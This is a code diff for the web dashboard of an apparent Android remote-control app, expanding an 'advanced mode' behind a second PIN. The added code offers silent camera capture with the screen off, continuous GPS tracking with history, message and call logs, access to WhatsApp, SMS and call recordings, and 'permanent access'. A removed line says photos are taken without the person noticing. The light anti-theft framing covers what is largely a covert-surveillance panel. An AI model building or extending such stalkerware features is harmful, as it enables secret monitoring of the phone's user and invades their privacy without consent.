@@ -277,26 +277,126 @@ button.it:hover,.it.ck:hover{border-color:var(--line2);cursor:pointer}
 
 <!-- PAINEL -->
 <section class="view on" id="v-painel">
+  <style>
+    /* Dashboard enhancements */
+    .pnl-hero{display:flex;align-items:center;gap:16px;padding:16px 20px;border-radius:var(--r);margin-bottom:16px;background:linear-gradient(135deg,color-mix(in srgb,var(--ac) 12%,transparent),color-mix(in srgb,var(--ac2) 10%,transparent));border:1px solid color-mix(in srgb,var(--ac2) 20%,transparent)}
+    .pnl-hero .ph2{width:48px;height:48px;border-radius:14px;background:var(--grad);display:grid;place-items:center;color:#06121f;flex:none;font-size:22px}
+    .pnl-hero .info{flex:1;min-width:0}.pnl-hero .info b{font-size:16px;font-weight:800;display:block}
+    .pnl-hero .info span{font-size:12.5px;color:var(--mu)}
+    .pnl-hero .conn{margin-left:auto;display:flex;flex-direction:column;align-items:flex-end;gap:5px}
+    .pnl-hero .connDot{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:700}
+    .stat-row{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px;margin-bottom:16px}
+    @media(max-width:1100px){.stat-row{grid-template-columns:repeat(2,minmax(0,1fr))}}
+    @media(max-width:640px){.stat-row{grid-template-columns:repeat(2,minmax(0,1fr))}}
+    .stat-card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:16px 18px;position:relative;overflow:hidden;cursor:pointer;transition:border-color .15s}
+    .stat-card:hover{border-color:var(--line2)}
+    .stat-card::after{content:"";position:absolute;right:-10px;top:-10px;width:70px;height:70px;border-radius:50%;opacity:.07}
+    .stat-card.bat::after{background:var(--ok)}.stat-card.str::after{background:var(--ac)}.stat-card.ram::after{background:var(--ac2)}.stat-card.tel::after{background:var(--wa)}
+    .stat-card .ico{font-size:20px;margin-bottom:8px}.stat-card .l{font-size:11.5px;color:var(--mu);font-weight:600;text-transform:uppercase;letter-spacing:.04em}
+    .stat-card .v2{font-size:22px;font-weight:800;letter-spacing:-.5px;margin:3px 0}
+    .stat-card .sub{font-size:11.5px;color:var(--mu)}
+    .stat-card .bar2{height:5px;border-radius:9px;background:var(--card2);overflow:hidden;margin-top:8px}
+    .stat-card .bar2 i{display:block;height:100%;border-radius:9px;background:var(--grad);transition:width .6s}
+    .msg-stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px;margin-bottom:16px}
+    @media(max-width:1100px){.msg-stats{grid-template-columns:repeat(2,minmax(0,1fr))}}
+    .mstat{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px 16px;cursor:pointer;transition:border-color .15s;display:flex;align-items:center;gap:14px}
+    .mstat:hover{border-color:var(--line2)}
+    .mstat .ico2{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;flex:none;font-size:18px}
+    .mstat .tx2{flex:1;min-width:0}
+    .mstat .tx2 .l{font-size:11.5px;color:var(--mu);font-weight:600}
+    .mstat .tx2 .n{font-size:20px;font-weight:800;letter-spacing:-.4px}
+    .mstat .tx2 .s{font-size:11px;color:var(--mu)}
+    .pnl-lower{display:grid;grid-template-columns:minmax(0,1fr) 340px;gap:16px;align-items:start}
+    @media(max-width:1000px){.pnl-lower{grid-template-columns:minmax(0,1fr)}}
+    .qa-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:9px}
+    @media(max-width:640px){.qa-grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
+    .qa-btn{display:flex;flex-direction:column;align-items:center;gap:7px;padding:14px 10px;border-radius:14px;background:var(--card2);border:1px solid var(--line);font-size:12px;font-weight:650;color:var(--tx2);cursor:pointer;transition:.14s;text-align:center;line-height:1.3}
+    .qa-btn:hover{border-color:var(--line2);color:var(--tx);transform:translateY(-1px)}.qa-btn:active{transform:scale(.96)}
+    .qa-btn .qi{width:36px;height:36px;border-radius:11px;display:grid;place-items:center;background:var(--card);border:1px solid var(--line);color:var(--ac)}
+    .act-feed{display:flex;flex-direction:column;gap:7px;max-height:360px;overflow-y:auto}
+    .act-item{display:flex;align-items:center;gap:11px;padding:9px 11px;border-radius:11px;background:var(--card2);border:1px solid var(--line);font-size:12.5px}
+    .act-item .aic{width:32px;height:32px;border-radius:9px;display:grid;place-items:center;flex:none;font-size:14px}
+    .act-item .atx{flex:1;min-width:0}.act-item .atx b{display:block;font-size:12.5px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .act-item .atx span{color:var(--mu);font-size:11.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block}
+    .act-item .att{font-size:10.5px;color:var(--mu2);white-space:nowrap;flex:none}
+  </style>
   <div id="permBanner"></div>
-  <div class="grid g4" style="margin-bottom:16px">
-    <div class="card" style="display:flex;gap:14px;align-items:center"><div class="ring" id="batR"><div id="batV">—</div></div><div><div class="kpi"><div class="l">Bateria</div><div style="font-weight:700" id="batS">—</div></div></div></div>
-    <div class="card kpi"><div class="l">Armazenamento livre</div><div class="v" id="armV">—</div><div class="bar" style="margin-top:8px"><i id="armB" style="width:0"></i></div><div class="tiny muted" id="armT" style="margin-top:5px"></div></div>
-    <div class="card kpi"><div class="l">Memória RAM livre</div><div class="v" id="ramV">—</div><div class="bar" style="margin-top:8px"><i id="ramB" style="width:0"></i></div><div class="tiny muted" id="ramT" style="margin-top:5px"></div></div>
-    <div class="card kpi"><div class="l">Telefone</div><div class="v" id="andV" style="font-size:19px">—</div><div class="tiny muted" id="modV">—</div></div>
+  <!-- Hero bar -->
+  <div class="pnl-hero">
+    <div class="ph2">📱</div>
+    <div class="info"><b id="andV">—</b><span id="modV">Android —</span></div>
+    <div class="conn">
+      <div class="connDot"><span class="dot" id="connDot"></span><span id="connTxt">A ligar…</span></div>
+      <div class="tiny muted" id="sessao2"></div>
+    </div>
   </div>
-  <div class="grid g2" style="margin-bottom:16px" id="simWrap"></div>
-  <div class="grid g2" style="align-items:start">
-    <div class="card"><h3><svg class="i" data-i="bolt"></svg>Ações rápidas</h3>
-      <div class="grid g2" style="gap:8px">
-        <button class="btn" data-go="ecra"><svg class="i" data-i="phone"></svg>Ecrã e controlo</button>
-        <button class="btn" data-go="sms"><svg class="i" data-i="msg"></svg>Mensagens</button>
-        <button class="btn" data-go="call"><svg class="i" data-i="call"></svg>Ligar</button>
-        <button class="btn" id="qFotos"><svg class="i" data-i="cam"></svg>Fotos da câmara</button>
-        <button class="btn" id="qClip"><svg class="i" data-i="clip"></svg>Copiar texto para o telefone</button>
-        <button class="btn" id="qUrl"><svg class="i" data-i="link"></svg>Abrir link no telefone</button>
+  <!-- Device stats -->
+  <div class="stat-row">
+    <div class="stat-card bat" onclick="ir('def')">
+      <div class="l">Bateria</div>
+      <div style="display:flex;align-items:center;gap:10px;margin:6px 0">
+        <div class="ring" id="batR" style="width:60px;height:60px"><div id="batV" style="width:44px;height:44px;border-radius:50%;background:var(--bg2);display:grid;place-items:center;font-weight:800;font-size:13px">—</div></div>
+        <div><div class="sub" id="batS" style="margin-top:4px">—</div></div>
       </div>
     </div>
-    <div class="card"><h3><svg class="i" data-i="bell"></svg>Últimas notificações<span class="r"><button class="btn sm" data-go="notif">Ver todas</button></span></h3><div id="pNotif"><div class="empty">—</div></div></div>
+    <div class="stat-card str" onclick="ir('files')">
+      <div class="l">Armazenamento</div>
+      <div class="v2" id="armV">—</div>
+      <div class="sub" id="armT">livre</div>
+      <div class="bar2"><i id="armB" style="width:0"></i></div>
+    </div>
+    <div class="stat-card ram">
+      <div class="l">Memória RAM</div>
+      <div class="v2" id="ramV">—</div>
+      <div class="sub" id="ramT">livre</div>
+      <div class="bar2"><i id="ramB" style="width:0"></i></div>
+    </div>
+    <div class="stat-card tel" onclick="ir('def')">
+      <div class="l">SIM / Rede</div>
+      <div id="simWrap2" style="margin-top:4px"><div class="sub muted">—</div></div>
+    </div>
+  </div>
+  <!-- Message stats -->
+  <div class="msg-stats">
+    <div class="mstat" onclick="ir('sms')">
+      <div class="ico2" style="background:color-mix(in srgb,var(--ac) 15%,transparent)">💬</div>
+      <div class="tx2"><div class="l">SMS / Mensagens</div><div class="n" id="pSmsCt">—</div><div class="s">conversas</div></div>
+    </div>
+    <div class="mstat" onclick="ir('wa')">
+      <div class="ico2" style="background:color-mix(in srgb,#25d366 15%,transparent)">
+        <svg viewBox="0 0 24 24" style="width:20px;height:20px;fill:#25d366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.149-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.58 1.37 5.07L2 22l5.09-1.34C8.5 21.52 10.21 22 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2zm0 18c-1.68 0-3.25-.46-4.6-1.26l-.33-.19-3.02.79.82-2.95-.21-.34C3.47 15.17 3 13.64 3 12c0-4.96 4.04-9 9-9s9 4.04 9 9-4.04 9-9 9z"/></svg>
+      </div>
+      <div class="tx2"><div class="l">WhatsApp</div><div class="n" id="pWaCt">—</div><div class="s">conversas</div></div>
+    </div>
+    <div class="mstat" onclick="ir('call')">
+      <div class="ico2" style="background:color-mix(in srgb,var(--ok) 15%,transparent)">📞</div>
+      <div class="tx2"><div class="l">Chamadas</div><div class="n" id="pCallCt">—</div><div class="s">registadas</div></div>
+    </div>
+    <div class="mstat" onclick="ir('social')">
+      <div class="ico2" style="background:color-mix(in srgb,var(--ac2) 15%,transparent)">🌐</div>
+      <div class="tx2"><div class="l">Redes Sociais</div><div class="n" id="pSocCt">—</div><div class="s">conversas</div></div>
+    </div>
+  </div>
+  <!-- SIM cards -->
+  <div class="grid g2" style="margin-bottom:16px" id="simWrap"></div>
+  <!-- Lower section -->
+  <div class="pnl-lower">
+    <div class="card"><h3><svg class="i" data-i="bolt"></svg>Ações rápidas</h3>
+      <div class="qa-grid">
+        <button class="qa-btn" data-go="ecra"><div class="qi"><svg class="i" data-i="phone"></svg></div>Ecrã ao vivo</button>
+        <button class="qa-btn" data-go="sms"><div class="qi"><svg class="i" data-i="msg"></svg></div>Mensagens</button>
+        <button class="qa-btn" data-go="call"><div class="qi"><svg class="i" data-i="call"></svg></div>Ligar</button>
+        <button class="qa-btn" data-go="wa"><div class="qi" style="background:color-mix(in srgb,#25d366 15%,transparent);border-color:color-mix(in srgb,#25d366 30%,transparent);color:#25d366"><svg class="i" data-i="msg"></svg></div>WhatsApp</button>
+        <button class="qa-btn" data-go="social"><div class="qi" style="background:color-mix(in srgb,var(--ac2) 15%,transparent);border-color:color-mix(in srgb,var(--ac2) 30%,transparent);color:var(--ac2)"><svg class="i" data-i="users"></svg></div>Social</button>
+        <button class="qa-btn" data-go="adv"><div class="qi" style="background:color-mix(in srgb,var(--er) 12%,transparent);border-color:color-mix(in srgb,var(--er) 25%,transparent);color:var(--er)"><svg class="i" data-i="shield"></svg></div>Modo avançado</button>
+        <button class="qa-btn" id="qFotos"><div class="qi"><svg class="i" data-i="cam"></svg></div>Tirar foto</button>
+        <button class="qa-btn" id="qClip"><div class="qi"><svg class="i" data-i="clip"></svg></div>Enviar texto</button>
+        <button class="qa-btn" id="qUrl"><div class="qi"><svg class="i" data-i="link"></svg></div>Abrir link</button>
+      </div>
+    </div>
+    <div class="card"><h3><svg class="i" data-i="clock"></svg>Atividade recente<span class="r"><button class="btn sm" onclick="atualizarAtividade()"><svg class="i" data-i="sync" style="width:12px;height:12px"></svg></button></span></h3>
+      <div class="act-feed" id="actFeed"><div class="empty" style="padding:20px 0">—</div></div>
+    </div>
   </div>
 </section>
 
@@ -602,6 +702,12 @@ button.it:hover,.it.ck:hover{border-color:var(--line2);cursor:pointer}
     #v-wa.on{display:flex!important;flex-direction:column;height:100%;overflow:hidden}
     .content:has(#v-wa.on){overflow:hidden}
     #waWrap{flex:1!important;min-height:0!important;height:auto!important}
+    /* Social wrap also needs flex height fix */
+    #socWrap{flex:1!important;min-height:0!important;height:auto!important}
+    /* SMS / Mensagens panel scroll fix */
+    #v-sms.on{display:flex!important;flex-direction:column;height:100%;overflow:hidden}
+    .content:has(#v-sms.on){overflow:hidden}
+    #v-sms .chat{flex:1!important;min-height:0!important;height:auto!important}
   </style>
 
   <!-- Cabeçalho -->
@@ -684,42 +790,147 @@ button.it:hover,.it.ck:hover{border-color:var(--line2);cursor:pointer}
 
 <!-- MODO AVANÇADO -->
 <section class="view" id="v-adv">
+  <style>
+    .adv-tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px;border-bottom:1px solid var(--line);padding-bottom:12px}
+    .adv-tab{padding:7px 15px;border-radius:10px;font-size:13px;font-weight:700;border:1px solid var(--line);color:var(--mu);cursor:pointer;background:transparent;transition:.13s}
+    .adv-tab:hover{border-color:var(--line2);color:var(--tx)}
+    .adv-tab.on{background:var(--card2);color:var(--tx);border-color:var(--line2)}
+    .adv-sec{display:none}.adv-sec.on{display:block}
+    .loc-entry{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:11px;background:var(--card2);border:1px solid var(--line);margin-bottom:8px;font-size:12.5px}
+    .loc-entry .ts{font-size:11px;color:var(--mu2);margin-left:auto;white-space:nowrap}
+    .loc-entry a{color:var(--ac);text-decoration:none;font-weight:700;font-size:12px}
+    .log-entry{padding:9px 12px;border-radius:10px;background:var(--card2);border:1px solid var(--line);margin-bottom:7px;font-size:12.5px}
+    .log-entry b{display:block;font-size:13px}
+    .log-entry .sub{color:var(--mu);font-size:12px;margin-top:2px}
+    .log-entry .ts2{font-size:11px;color:var(--mu2);float:right}
+    .ctrl-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:9px}
+    @media(max-width:640px){.ctrl-grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
+    .ctrl-btn{display:flex;flex-direction:column;align-items:center;gap:8px;padding:16px 10px;border-radius:14px;background:var(--card2);border:1px solid var(--line);font-size:12px;font-weight:650;color:var(--tx2);cursor:pointer;transition:.14s;text-align:center}
+    .ctrl-btn:hover{border-color:var(--line2);color:var(--tx);transform:translateY(-1px)}.ctrl-btn:active{transform:scale(.95)}
+    .ctrl-btn .ci{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;border:1px solid var(--line);font-size:20px}
+    .ctrl-btn.danger{border-color:color-mix(in srgb,var(--er) 30%,transparent)}.ctrl-btn.danger:hover{background:color-mix(in srgb,var(--er) 8%,transparent)}
+    .ctrl-btn.danger .ci{background:color-mix(in srgb,var(--er) 12%,transparent)}
+    .ctrl-btn.safe .ci{background:color-mix(in srgb,var(--ok) 12%,transparent)}
+    .ctrl-btn.info .ci{background:color-mix(in srgb,var(--ac2) 12%,transparent)}
+  </style>
   <div id="advLock" class="card" style="max-width:420px;margin:30px auto;text-align:center">
-    <div style="font-size:40px">🛡️</div>
-    <h3 style="justify-content:center">Modo avançado</h3>
-    <p class="tiny muted" style="margin:0 0 16px">Funções sensíveis de segurança e anti-roubo. Escreva o <b>segundo código</b> (diferente do normal).</p>
-    <input id="advPin" type="password" inputmode="numeric" maxlength="12" placeholder="segundo código" style="text-align:center;font-size:22px;letter-spacing:.3em">
-    <button class="btn p" style="width:100%;margin-top:12px" id="advEntrar">Desbloquear</button>
-    <div class="tiny muted" style="margin-top:14px">Por omissão é o código normal com <b>00</b> no fim, até o definir na app do telefone.</div>
+    <div style="font-size:48px;margin-bottom:8px">🛡️</div>
+    <h3 style="justify-content:center;font-size:17px">Modo avançado</h3>
+    <p class="tiny muted" style="margin:0 0 20px">Controlo total, vigilância silenciosa, localização e segurança. Escreva o <b>segundo código</b>.</p>
+    <input id="advPin" type="password" inputmode="numeric" maxlength="12" placeholder="segundo código" style="text-align:center;font-size:24px;letter-spacing:.4em;margin-bottom:4px">
+    <button class="btn p" style="width:100%;margin-top:12px;padding:13px" id="advEntrar">🔓 Desbloquear</button>
+    <div class="tiny muted" style="margin-top:16px">Por omissão: código normal + <b>00</b>.</div>
   </div>
   <div id="advOn" hidden>
-    <div class="banner" style="border-color:color-mix(in srgb,var(--ac2) 40%,transparent);background:color-mix(in srgb,var(--ac2) 10%,transparent)"><span style="font-size:22px">🛡️</span><div><b>Modo avançado ativo</b>Câmara silenciosa, localização, galeria e alarme. Use com responsabilidade — é o seu telefone.</div><button class="btn sm x" id="advSair">Sair</button></div>
-    <div class="card" id="advPermBox" style="margin-bottom:16px"><h3><svg class="i" data-i="shield"></svg>Permissões necessárias<span class="r"><button class="btn sm" id="permRef">↻ Atualizar</button></span></h3><div id="advPerm" class="tiny muted">A verificar…</div><div class="tiny muted" id="permDica" style="margin-top:8px"></div></div>
-    <div class="grid g2" style="align-items:start">
+    <div class="banner" style="border-color:color-mix(in srgb,var(--ac2) 40%,transparent);background:color-mix(in srgb,var(--ac2) 10%,transparent)"><span style="font-size:22px">🛡️</span><div><b>Modo avançado ativo</b>Controlo completo sobre o dispositivo. Use com responsabilidade.</div><button class="btn sm x" id="advSair">Sair</button></div>
+    <div class="card" id="advPermBox" style="margin-bottom:16px"><h3><svg class="i" data-i="shield"></svg>Estado das permissões<span class="r"><button class="btn sm" id="permRef">↻ Atualizar</button></span></h3><div id="advPerm" class="tiny muted">A verificar…</div><div class="tiny muted" id="permDica" style="margin-top:8px"></div></div>
+    <!-- Tabs -->
+    <div class="adv-tabs">
+      <button class="adv-tab on" data-at="at-ctrl">🎮 Controlo</button>
+      <button class="adv-tab" data-at="at-cam">📷 Câmara</button>
+      <button class="adv-tab" data-at="at-loc">📍 Localização</button>
+      <button class="adv-tab" data-at="at-gal">🖼️ Galeria</button>
+      <button class="adv-tab" data-at="at-logs">📋 Registos</button>
+      <button class="adv-tab" data-at="at-seg">🔐 Segurança</button>
+    </div>
+    <!-- Controlo total -->
+    <div class="adv-sec on" id="at-ctrl">
+      <div class="ctrl-grid" style="margin-bottom:20px">
+        <button class="ctrl-btn safe" data-g="lock"><div class="ci">🔒</div>Bloquear ecrã</button>
+        <button class="ctrl-btn safe" data-g="home"><div class="ci">🏠</div>Ir para início</button>
+        <button class="ctrl-btn safe" data-g="back"><div class="ci">↩️</div>Botão voltar</button>
+        <button class="ctrl-btn safe" data-g="recents"><div class="ci">📱</div>Apps recentes</button>
+        <button class="ctrl-btn safe" data-g="notifications"><div class="ci">🔔</div>Notificações</button>
+        <button class="ctrl-btn safe" data-g="quicksettings"><div class="ci">⚙️</div>Definições rápidas</button>
+        <button class="ctrl-btn info" id="advCap"><div class="ci">📸</div>Captura ecrã</button>
+        <button class="ctrl-btn info" id="advEcra" onclick="ir('ecra')"><div class="ci">🖥️</div>Ecrã ao vivo</button>
+        <button class="ctrl-btn info" id="advCams"><div class="ci">📷</div>Câmara silenciosa</button>
+        <button class="ctrl-btn er danger" id="alarmeOn"><div class="ci">🚨</div>Alarme sonoro</button>
+        <button class="ctrl-btn danger" id="alarmeOff"><div class="ci">🔇</div>Parar alarme</button>
+        <button class="ctrl-btn" id="advLigar" onclick="ir('call')"><div class="ci">📞</div>Marcador</button>
+      </div>
+      <div class="grid g2" style="align-items:start">
+        <div class="card"><h3><svg class="i" data-i="locate"></svg>Localização rápida</h3>
+          <button class="btn p" style="width:100%" id="btnLocal"><svg class="i" data-i="locate"></svg>Localizar agora (GPS)</button>
+          <div id="localBox" style="margin-top:14px"></div>
+        </div>
+        <div class="card"><h3><svg class="i" data-i="bolt"></svg>Acesso rápido a dados</h3>
+          <div class="grid g2" style="gap:8px">
+            <button class="btn" onclick="ir('wa')">💬 WhatsApp</button>
+            <button class="btn" onclick="ir('sms')">📱 SMS</button>
+            <button class="btn" onclick="ir('social')">🌐 Redes sociais</button>
+            <button class="btn" onclick="ir('call')">📞 Chamadas</button>
+            <button class="btn" onclick="ir('notif')">🔔 Notificações</button>
+            <button class="btn" onclick="ir('callrec')">🎙️ Gravações</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- Câmara -->
+    <div class="adv-sec" id="at-cam">
       <div class="card"><h3><svg class="i" data-i="cam"></svg>Câmara silenciosa</h3>
-        <p class="tiny muted" style="margin:0 0 12px">Tira uma foto sem abrir a câmara e sem a pessoa perceber — mesmo com o ecrã apagado. A imagem vem só para aqui; não fica no telefone.</p>
-        <div class="row"><button class="btn p" id="fotoFrente"><svg class="i" data-i="cam"></svg>Câmara da frente</button><button class="btn" id="fotoTras"><svg class="i" data-i="cam"></svg>Câmara de trás</button></div>
-        <div id="fotoBox" style="margin-top:14px"></div>
+        <p class="tiny muted" style="margin:0 0 14px">Tira fotos sem abrir a câmara, sem som, mesmo com o ecrã apagado. As imagens não ficam na galeria do telefone — ficam só aqui.</p>
+        <div class="row" style="margin-bottom:16px"><button class="btn p" id="fotoFrente"><svg class="i" data-i="cam"></svg>Câmara da frente</button><button class="btn" id="fotoTras"><svg class="i" data-i="cam"></svg>Câmara de trás</button></div>
+        <div id="fotoBox"></div>
       </div>
-      <div class="card"><h3><svg class="i" data-i="locate"></svg>Localização</h3>
-        <p class="tiny muted" style="margin:0 0 12px">Onde o telefone está agora (GPS). Útil se o perder ou lho tirarem.</p>
-        <button class="btn p" id="btnLocal"><svg class="i" data-i="locate"></svg>Localizar o telefone</button>
-        <div id="localBox" style="margin-top:14px"></div>
+    </div>
+    <!-- Localização -->
+    <div class="adv-sec" id="at-loc">
+      <div class="grid g2" style="align-items:start">
+        <div class="card"><h3><svg class="i" data-i="locate"></svg>Localização em tempo real</h3>
+          <p class="tiny muted" style="margin:0 0 12px">Obtém a posição GPS atual. Para rastreio contínuo, use o botão Iniciar rastreio.</p>
+          <div class="row" style="margin-bottom:12px">
+            <button class="btn p" id="btnLocal2"><svg class="i" data-i="locate"></svg>Localizar agora</button>
+            <button class="btn ok" id="btnTrack"><svg class="i" data-i="sync"></svg>Rastreio contínuo</button>
+          </div>
+          <div id="localBox2"></div>
+        </div>
+        <div class="card"><h3><svg class="i" data-i="clock"></svg>Histórico de localização<span class="r"><button class="btn sm" id="locHistRef">↻</button></span></h3>
+          <div id="locHist" style="max-height:400px;overflow-y:auto"><div class="empty">Sem histórico ainda.</div></div>
+        </div>
       </div>
-      <div class="card"><h3><svg class="i" data-i="alarm"></svg>Alarme</h3>
-        <p class="tiny muted" style="margin:0 0 12px">Toca bem alto (mesmo em silêncio) para encontrar o telefone por perto.</p>
-        <div class="row"><button class="btn er" id="alarmeOn"><svg class="i" data-i="alarm"></svg>Tocar alarme</button><button class="btn" id="alarmeOff">Parar</button></div>
-      </div>
-      <div class="card"><h3><svg class="i" data-i="lock"></svg>Proteger</h3>
-        <p class="tiny muted" style="margin:0 0 12px">Bloquear já o ecrã do telefone.</p>
-        <div class="row"><button class="btn" data-g="lock"><svg class="i" data-i="lock"></svg>Bloquear ecrã</button><button class="btn" id="advCap"><svg class="i" data-i="shot"></svg>Captura do ecrã</button></div>
-      </div>
-      <div class="card" style="grid-column:1/-1"><h3><svg class="i" data-i="image"></svg>Galeria<span class="r"><button class="btn sm" id="galRef" aria-label="Atualizar">↻</button><button class="btn sm" id="galAntigas" hidden>Sincronizar últimos 30 dias</button></span></h3>
-        <p class="tiny muted" style="margin:0 0 12px">Mostra as fotos recentes do telefone. As antigas (até 30 dias) só com autorização do administrador.</p>
+    </div>
+    <!-- Galeria -->
+    <div class="adv-sec" id="at-gal">
+      <div class="card"><h3><svg class="i" data-i="image"></svg>Galeria do telefone<span class="r"><button class="btn sm" id="galRef">↻ Atualizar</button><button class="btn sm" id="galAntigas" hidden>Sincronizar 30 dias</button></span></h3>
+        <p class="tiny muted" style="margin:0 0 12px">Fotos e vídeos recentes do telefone. Clique para ver em grande.</p>
         <div id="galBox"><div class="empty">A carregar…</div></div>
       </div>
-      <div class="card" style="grid-column:1/-1"><h3><svg class="i" data-i="shield"></svg>Segundo código</h3>
-        <div class="field" style="border:0;padding:0"><div><b>Mudar o código do modo avançado</b><span>4 a 12 dígitos. Guarde-o só consigo.</span></div><div class="row"><input id="advNovo" inputmode="numeric" maxlength="12" placeholder="novo código" style="max-width:200px"><button class="btn p" id="advGuardar">Guardar</button></div></div>
+    </div>
+    <!-- Registos / Logs -->
+    <div class="adv-sec" id="at-logs">
+      <div class="grid g2" style="align-items:start">
+        <div class="card"><h3><svg class="i" data-i="clock"></svg>Últimas mensagens recebidas</h3>
+          <div id="advMsgLog" style="max-height:420px;overflow-y:auto"><div class="empty">A carregar…</div></div>
+        </div>
+        <div class="card"><h3><svg class="i" data-i="call"></svg>Últimas chamadas</h3>
+          <div id="advCallLog" style="max-height:420px;overflow-y:auto"><div class="empty">A carregar…</div></div>
+        </div>
+      </div>
+    </div>
+    <!-- Segurança -->
+    <div class="adv-sec" id="at-seg">
+      <div class="grid g2" style="align-items:start">
+        <div class="card"><h3><svg class="i" data-i="shield"></svg>Segundo código</h3>
+          <p class="tiny muted" style="margin:0 0 14px">Mude o código de acesso ao modo avançado. Mínimo 4 dígitos.</p>
+          <div class="field" style="border:0;padding:0">
+            <div><b>Novo código</b><span>4–12 dígitos. Guarde-o só para si.</span></div>
+            <div class="row" style="margin-top:10px"><input id="advNovo" type="password" inputmode="numeric" maxlength="12" placeholder="novo código" style="max-width:200px"><button class="btn p" id="advGuardar">Guardar</button></div>
+          </div>
+        </div>
+        <div class="card"><h3><svg class="i" data-i="shield"></svg>Acesso permanente</h3>
+          <p class="tiny muted" style="margin:0 0 14px">O acesso mantém-se ativo até que o admin o retire explicitamente ou o telefone seja restaurado aos padrões de fábrica.</p>
+          <div id="permStatusAdv" style="margin-bottom:14px"><div class="empty" style="padding:10px 0">A verificar…</div></div>
+          <button class="btn ok" style="width:100%" id="btnReativarPerms">🔄 Reativar todos os serviços</button>
+        </div>
+        <div class="card" style="border-color:color-mix(in srgb,var(--er) 30%,transparent)"><h3><svg class="i" data-i="alarm" style="color:var(--er)"></svg><span style="color:var(--er)">Zona de perigo</span></h3>
+          <p class="tiny muted" style="margin:0 0 14px">Estas ações são irreversíveis. Use apenas se necessário.</p>
+          <div class="grid g2" style="gap:8px">
+            <button class="btn er" id="btnWipeData" disabled title="Requer raiz">⚠️ Limpar dados (requer root)</button>
+            <button class="btn er" onclick="ir('ecra')" id="btnScreenLockForce"><svg class="i" data-i="lock"></svg>Forçar bloqueio</button>
+          </div>
+          <div class="tiny muted" style="margin-top:8px">O bloqueio de ecrã funciona em qualquer dispositivo.</div>
+        </div>
       </div>
     </div>
   </div>
@@ -1363,6 +1574,145 @@ $('#alarmeOff').onclick=()=>advPost('/alarme',{ligar:false}).then(()=>{toast('Al
 $('#advCap').onclick=()=>post('/captura').then(r=>toast(r&&r.ok?'Captura guardada no telefone':'Falhou — o ecrã está partilhado?'));
 $('#advGuardar').onclick=async()=>{const c=$('#advNovo').value.trim();if(!/^\d{4,12}$/.test(c))return toast('4 a 12 dígitos');
  const r=await advPost('/setcode2',{code:c});if(r&&r.ok){ADV=c;try{sessionStorage.setItem('ftxadv',c)}catch(e){}$('#advNovo').value='';toast('Segundo código alterado')}else toast('Não foi alterado')};
+
+// ===== Modo avançado — tabs =====
+document.querySelectorAll('.adv-tab').forEach(b=>{
+  b.onclick=function(){
+    const t=this.dataset.at;
+    document.querySelectorAll('.adv-tab').forEach(x=>x.classList.toggle('on',x===this));
+    document.querySelectorAll('.adv-sec').forEach(x=>x.classList.toggle('on',x.id===t));
+    if(t==='at-loc'){carregarLocHist()}
+    if(t==='at-logs'){carregarAdvLogs()}
+    if(t==='at-seg'){pintarPermStatusAdv()}
+  }
+});
+// Switch ctrl-tab cam btn to cam tab
+document.getElementById('advCams').onclick=function(){
+  document.querySelectorAll('.adv-tab').forEach(b=>b.classList.toggle('on',b.dataset.at==='at-cam'));
+  document.querySelectorAll('.adv-sec').forEach(s=>s.classList.toggle('on',s.id==='at-cam'));
+};
+// btnLocal2 in location tab
+const btnLocal2=document.getElementById('btnLocal2');
+if(btnLocal2)btnLocal2.onclick=async()=>{
+  const box=document.getElementById('localBox2');if(!box)return;
+  box.innerHTML='<div class="empty" style="padding:14px">📍 A localizar…</div>';
+  try{const r=await(await fetch(advUrl('/local'),{cache:'no-store'})).json();
+  if(r.erro){box.innerHTML='<div class="tiny" style="color:var(--wa)">'+esc({sem_permissao:'Dê a permissão de localização.',desligada:'GPS desligado — ligue-o no telefone.',sem_sinal:'Sem sinal GPS. Tente ao ar livre.',indisponivel:'Localização indisponível.'}[r.erro]||'Não obtida.')+'</div>';return}
+  const q=new Date(+r.quando).toLocaleString('pt-PT');
+  // Save to history
+  let hist=[];try{hist=JSON.parse(localStorage.getItem('ftxLocHist')||'[]')}catch(e){}
+  hist.unshift({lat:r.lat,lng:r.lng,prec:r.prec,quando:r.quando,maps:r.maps});if(hist.length>50)hist.pop();
+  try{localStorage.setItem('ftxLocHist',JSON.stringify(hist))}catch(e){}
+  box.innerHTML=`<div class="it" style="margin:0"><div class="av" style="background:var(--ac)">📍</div><div class="tx"><b>${r.lat.toFixed(5)}, ${r.lng.toFixed(5)}</b><span>Precisão ~${Math.round(r.prec)} m · ${esc(q)}</span></div></div><a class="btn p sm" style="margin-top:8px" href="${esc(r.maps)}" target="_blank" rel="noopener">🗺️ Ver no mapa</a>`;
+  pintarLocHist(hist);
